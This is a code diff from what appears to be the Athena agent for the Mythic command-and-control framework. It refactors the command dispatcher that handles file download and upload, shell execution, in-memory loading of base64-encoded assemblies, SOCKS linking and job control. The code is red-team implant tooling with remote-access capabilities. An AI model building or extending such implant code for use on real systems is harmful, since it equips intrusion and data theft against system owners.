@@ -21,35 +21,33 @@ namespace Athena.Commands
         /// Kick off a MythicJob
         /// </summary>
         /// <param name="job">MythicJob containing execution parameters</param>
-        public static void StartJob(MythicJob job)
+        public static async void StartJob(MythicJob job)
         {
             switch (job.task.command)
             {
                 case "download":
-                    Task.Run(() => {
-                        if (!Globals.downloadJobs.ContainsKey(job.task.id))
+                    if (!Globals.downloadJobs.ContainsKey(job.task.id))
+                    {
+                        MythicDownloadJob downloadJob = new MythicDownloadJob(job);
+                        Dictionary<string, string> par = JsonConvert.DeserializeObject<Dictionary<string, string>>(job.task.parameters);
+                        downloadJob.path = par["File"].Replace("\"", "");
+                        downloadJob.total_chunks = downloadJob.GetTotalChunks();
+
+                        Globals.downloadJobs.Add(job.task.id, downloadJob);
+
+                        if (downloadJob.total_chunks == 0)
                         {
-                            MythicDownloadJob downloadJob = new MythicDownloadJob(job);
-                            Dictionary<string, string> par = JsonConvert.DeserializeObject<Dictionary<string, string>>(job.task.parameters);
-                            downloadJob.path = par["File"].Replace("\"", "");
-                            downloadJob.total_chunks = downloadJob.GetTotalChunks();
-                            
-                            Globals.downloadJobs.Add(job.task.id, downloadJob);
-
-                            if (downloadJob.total_chunks == 0)
-                            {
-                                job.errored = true;
-                                job.taskresult = "An error occurred while attempting to access the file.";
-                                job.hasoutput = true;
-                                job.complete = true;
-                            }
-
-                            //Download response ready to return
-                            job.started = true;
-                            job.taskresult = "";
+                            job.errored = true;
+                            job.taskresult = "An error occurred while attempting to access the file.";
                             job.hasoutput = true;
+                            job.complete = true;
                         }
-                    });
+
+                        //Download response ready to return
+                        job.started = true;
+                        job.taskresult = "";
+                        job.hasoutput = true;
+                    }
                     break;
                 case "execute-assembly":
                     if (executeAssemblyTask != "")
@@ -111,62 +109,57 @@ namespace Athena.Commands
                     Environment.Exit(0);
                     break;
                 case "jobs":
-                    Task.Run(() => {
-                        string output = "[";
-                        foreach (var job in Globals.jobs)
-                        {
-                            output += $"{{\"id\":\"{job.Value.task.id}\",";
-                            output += $"\"command\":\"{job.Value.task.command}\",";
-                            if (job.Value.started & !job.Value.complete)
-                            {
-                                output += $"\"status\":\"Started\"}},";
-                            }
-                            else if (job.Value.complete)
-                            {
-                                output += $"\"status\":\"Completed\"}},";
-                            }
-                            else
-                            {
-                                output += $"\"status\":\"Not Started\"}},";
-                            }
-                        }
-                        output = output.TrimEnd(',') + "]";
-                        completeJob(ref job, output, false);
-                    }, job.cancellationtokensource.Token);
-                    break;
-                case "jobkill":
-                    Task.Run(() =>
+                    string output = "[";
+                    foreach (var j in Globals.jobs)
                     {
-                        MythicJob job = Globals.jobs.FirstOrDefault(x => x.Value.task.id == x.Value.task.parameters).Value;
-                        if (job is not null)
+                        output += $"{{\"id\":\"{j.Value.task.id}\",";
+                        output += $"\"command\":\"{j.Value.task.command}\",";
+                        if (j.Value.started & !j.Value.complete)
                         {
-                            //Attempt the cancel.
-                            job.cancellationtokensource.Cancel();
-
-                            //Wait to see if the cancel took.
-                            for (int i = 0; i != 31; i++)
-                            {
-                                //Job exited successfully
-                                if (job.complete)
-                                {
-                                    completeJob(ref job, $"Task {job.task.parameters} exited successfully.", false);
-                                    break;
-                                }
-                                //Job may have failed to cancel
-                                if (i == 30 && !job.complete)
-                                {
-                                    completeJob(ref job, $"Unable to cancel Task: {job.task.parameters}. Request timed out.", true);
-                                }
-
-                                //Wait 1s, This will be 30s once all the loops complete.
-                                Thread.Sleep(1000);
-                            }
+                            output += $"\"status\":\"Started\"}},";
+                        }
+                        else if (j.Value.complete)
+                        {
+                            output += $"\"status\":\"Completed\"}},";
                         }
                         else
                         {
-                            completeJob(ref job, $"Task {job.task.parameters} not found!", true);
+                            output += $"\"status\":\"Not Started\"}},";
                         }
-                    }, job.cancellationtokensource.Token);
+                    }
+                    output = output.TrimEnd(',') + "]";
+                    completeJob(ref job, output, false);
+                    break;
+                case "jobkill":
+                    MythicJob jobToKill = Globals.jobs.FirstOrDefault(x => x.Value.task.id == x.Value.task.parameters).Value;
+                    if (jobToKill is not null)
+                    {
+                        //Attempt the cancel.
+                        jobToKill.cancellationtokensource.Cancel();
+
+                        //Wait to see if the cancel took.
+                        for (int i = 0; i != 31; i++)
+                        {
+                            //Job exited successfully
+                            if (jobToKill.complete)
+                            {
+                                completeJob(ref jobToKill, $"Task {jobToKill.task.parameters} exited successfully.", false);
+                                break;
+                            }
+                            //Job may have failed to cancel
+                            if (i == 30 && !jobToKill.complete)
+                            {
+                                completeJob(ref jobToKill, $"Unable to cancel Task: {jobToKill.task.parameters}. Request timed out.", true);
+                            }
+
+                            //Wait 1s, This will be 30s once all the loops complete.
+                            await Task.Delay(1000);
+                        }
+                    }
+                    else
+                    {
+                        completeJob(ref job, $"Task {job.task.parameters} not found!", true);
+                    }
                     break;
                 case "link":
                     {
@@ -197,37 +190,26 @@ namespace Athena.Commands
                     }
                     break;
                 case "load":
-                    Task.Run(() =>
-                    {
-                        LoadCommand lc = JsonConvert.DeserializeObject<LoadCommand>(job.task.parameters);
-                        completeJob(ref job, AssemblyHandler.LoadCommand(Misc.Base64DecodeToByteArray(lc.assembly), lc.command), false);
-                    }, job.cancellationtokensource.Token);
+                    LoadCommand lc = JsonConvert.DeserializeObject<LoadCommand>(job.task.parameters);
+                    completeJob(ref job, AssemblyHandler.LoadCommand(Misc.Base64DecodeToByteArray(lc.assembly), lc.command), false);
                     break;
                 //Can these all be merged into one and handled on the server-side?
                 case "load-assembly":
-                    Task.Run(() => {
-                        try
-                        {
-                            LoadAssembly la = JsonConvert.DeserializeObject<LoadAssembly>(job.task.parameters);
-                            completeJob(ref job, AssemblyHandler.LoadAssembly(Misc.Base64DecodeToByteArray(la.assembly)), false);
-                        }
-                        catch (Exception e)
-                        {
-                            completeJob(ref job, e.Message, true);
-                        }
-                    }, job.cancellationtokensource.Token);
+                    try
+                    {
+                        LoadAssembly la = JsonConvert.DeserializeObject<LoadAssembly>(job.task.parameters);
+                        completeJob(ref job, AssemblyHandler.LoadAssembly(Misc.Base64DecodeToByteArray(la.assembly)), false);
+                    }
+                    catch (Exception e)
+                    {
+                        completeJob(ref job, e.Message, true);
+                    }
                     break;
                 case "reset-assembly-context":
-                    Task.Run(() =>
-                    {
-                        completeJob(ref job, AssemblyHandler.ClearAssemblyLoadContext(), false);
-                    }, job.cancellationtokensource.Token);
+                    completeJob(ref job, AssemblyHandler.ClearAssemblyLoadContext(), false);
                     break;
                 case "shell":
-                    Task.Run(() =>
-                    {
-                        Execution.ShellExec(job);
-                    }, job.cancellationtokensource.Token);
+                    Execution.ShellExec(job);
                     break;
                 case "sleep":
                     var sleepInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters);
@@ -310,58 +292,46 @@ namespace Athena.Commands
                     }
                     break;
                 case "stop-assembly":
-                    Task.Run(() => {
-                        completeJob(ref job, "This function does not work properly yet.", true);
-                    }, job.cancellationtokensource.Token);
+                    completeJob(ref job, "This function does not work properly yet.", true);
                     break;
                 case "unlink":
-                    Task.Run(() =>
+                    if (Globals.socksHandler.running)
                     {
-                        if (Globals.socksHandler.running)
-                        {
-                            Globals.socksHandler.Stop();
-                            completeJob(ref job, "Unlinked from agent.", false);
-                        }
-                        else
-                        {
-                            completeJob(ref job, "No agent currently connected.", true);
-                        }
-                    }, job.cancellationtokensource.Token);
+                        Globals.socksHandler.Stop();
+                        completeJob(ref job, "Unlinked from agent.", false);
+                    }
+                    else
+                    {
+                        completeJob(ref job, "No agent currently connected.", true);
+                    }
                     break;
                 case "upload":
-                    var uploadTask = Task.Run(() =>
+                    try
                     {
-                        try
+                        if (!Globals.uploadJobs.ContainsKey(job.task.id))
                         {
-                            if (!Globals.uploadJobs.ContainsKey(job.task.id))
-                            {
-                                MythicUploadJob uj = new MythicUploadJob(job);
-                                Dictionary<string, string> par = JsonConvert.DeserializeObject<Dictionary<string, string>>(job.task.parameters);
-                                uj.path = par["remote_path"];
-                                uj.file_id = par["file"];
-                                uj.task = job.task;
-                                uj.chunk_num = 1;
-                                job.started = true;
-                                job.hasoutput = true;
-                                job.taskresult = "";
+                            MythicUploadJob uj = new MythicUploadJob(job);
+                            Dictionary<string, string> par = JsonConvert.DeserializeObject<Dictionary<string, string>>(job.task.parameters);
+                            uj.path = par["remote_path"];
+                            uj.file_id = par["file"];
+                            uj.task = job.task;
+                            uj.chunk_num = 1;
+                            job.started = true;
+                            job.hasoutput = true;
+                            job.taskresult = "";
 
-                                //Add job to job tracking Dictionary
-                                Globals.uploadJobs.Add(uj.task.id, uj);
-                            }
+                            //Add job to job tracking Dictionary
+                            Globals.uploadJobs.Add(uj.task.id, uj);
                         }
-                        catch (Exception e)
-                        {
-                            Misc.WriteError(e.Message);
-                            completeJob(ref job, e.Message, true);
-                        }
-
-                    }, job.cancellationtokensource.Token);
+                    }
+                    catch (Exception e)
+                    {
+                        Misc.WriteError(e.Message);
+                        completeJob(ref job, e.Message, true);
+                    }
                     break;
                 default:
-                    var defaultTask = Task.Run(() =>
-                    {
-                        checkAndRunPlugin(job);
-                    }, job.cancellationtokensource.Token);
+                    checkAndRunPlugin(job);
                     break;
             }
         }
